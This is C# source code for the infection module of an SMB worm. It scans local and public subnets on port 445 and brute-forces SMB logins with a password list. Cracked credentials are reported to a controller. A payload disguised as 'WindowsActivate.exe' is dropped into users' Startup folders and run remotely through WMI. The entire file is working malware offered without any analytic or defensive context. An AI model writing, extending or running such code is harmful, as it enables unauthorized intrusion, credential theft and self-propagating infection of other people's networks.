using System;
using System.Collections.Generic;
using System.Net;
using System.Text.RegularExpressions;
using Leb128;
using Plugin.Helper;
using SMBLibrary;
using SMBLibrary.Client;
using SmbWorm.Joiner;
using Worm2.Helper;

namespace SmbWorm.Smb;

internal class SmbInfector
{
	public static string WebIpInfo()
	{
		try
		{
			return Regex.Match(new WebClient().DownloadString("http://ipinfo.io"), "\"ip\": \"(.*)\"").Groups[1].Value;
		}
		catch
		{
			return "null";
		}
	}

	public static void Run()
	{
		IpLocalHost ipLocalHost = new IpLocalHost();
		ScanHosts scanHosts = new ScanHosts();
		scanHosts.SuccuesScan += SuccuesScan;
		scanHosts.SuccuesScan += delegate(string ip, int port)
		{
			Client.Send(LEB128.Write(new object[2]
			{
				"WormLog1",
				"Tcp Scaner: Open port " + ip + ":" + port
			}));
		};
		string[] array = WebIpInfo().Split(new char[1] { '.' });
		Client.Send(LEB128.Write(new object[2]
		{
			"WormLog1",
			"Tcp Scaner: Run Scan  " + ipLocalHost.startIP.ToString() + "-" + ipLocalHost.endIP.ToString()
		}));
		Client.Send(LEB128.Write(new object[2]
		{
			"WormLog1",
			"Tcp Scaner: Run Scan  " + new IPAddress(new byte[4]
			{
				Convert.ToByte(array[0]),
				Convert.ToByte(array[1]),
				Convert.ToByte(array[2]),
				0
			}).ToString() + "-" + new IPAddress(new byte[4]
			{
				Convert.ToByte(array[0]),
				Convert.ToByte(array[1]),
				Convert.ToByte(array[2]),
				255
			}).ToString()
		}));
		scanHosts.Scan(ipLocalHost.IPAddressesRange(), 445);
		scanHosts.Scan(ipLocalHost.IPAddressesRange(new IPAddress(new byte[4]
		{
			Convert.ToByte(array[0]),
			Convert.ToByte(array[1]),
			Convert.ToByte(array[2]),
			0
		}), new IPAddress(new byte[4]
		{
			Convert.ToByte(array[0]),
			Convert.ToByte(array[1]),
			Convert.ToByte(array[2]),
			255
		})), 445);
	}

	public static void SuccuesScan(string Ips, int port)
	{
		Console.WriteLine(Ips + ":" + port);
		Brute brute = SmbBrute.Brutforce(Ips, PasswordList.passwords);
		if (!brute.Bruted)
		{
			return;
		}
		Console.WriteLine("Brute It!");
		Client.Send(LEB128.Write(new object[2]
		{
			"WormLog1",
			"Brute It: " + Ips + ":" + port + "@" + brute.Login + ":" + brute.Password
		}));
		bool flag = false;
		NTStatus status;
		List<string> list = brute.SMB2Client.ListShares(out status);
		if (status != 0)
		{
			return;
		}
		foreach (string item in list)
		{
			ISMBFileStore fileStore = brute.SMB2Client.TreeConnect(item, out status);
			if (status != 0)
			{
				continue;
			}
			if (item.ToLower().Contains("users"))
			{
				foreach (FileDirectoryInformation item2 in SmbMethods.GetDir(fileStore, ""))
				{
					string text = item2.FileName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsActivate.exe";
					if (SmbMethods.WriteFile(fileStore, brute.SMB2Client, Config.Bulid, text))
					{
						string text2 = WimExcuter.Run(brute.Ip, "C:\\" + item + "\\" + text, new WimAccount
						{
							Login = brute.Login,
							Password = brute.Password
						});
						Client.Send(LEB128.Write(new object[2]
						{
							"WormLog2",
							"WimExcuter: \\\\" + brute.Ip + "@" + brute.Login + ":" + brute.Password + " Return: " + text2
						}));
						flag = true;
						break;
					}
				}
			}
			else if (!flag)
			{
				string text3 = SmbMethods.GetDir(fileStore, "")[0].FileName + "\\WindowsActivate.exe";
				if (SmbMethods.WriteFile(fileStore, brute.SMB2Client, Config.Bulid, text3))
				{
					string text4 = WimExcuter.Run(brute.Ip, "C:\\" + item + "\\" + text3, new WimAccount
					{
						Login = brute.Login,
						Password = brute.Password
					});
					Client.Send(LEB128.Write(new object[2]
					{
						"WormLog2",
						"WimExcuter: \\\\" + brute.Ip + "@" + brute.Login + ":" + brute.Password + " Return: " + text4
					}));
					flag = true;
				}
			}
		}
		Console.WriteLine("SmbJoiner");
		new SmbJoiner(brute).Start();
	}
}
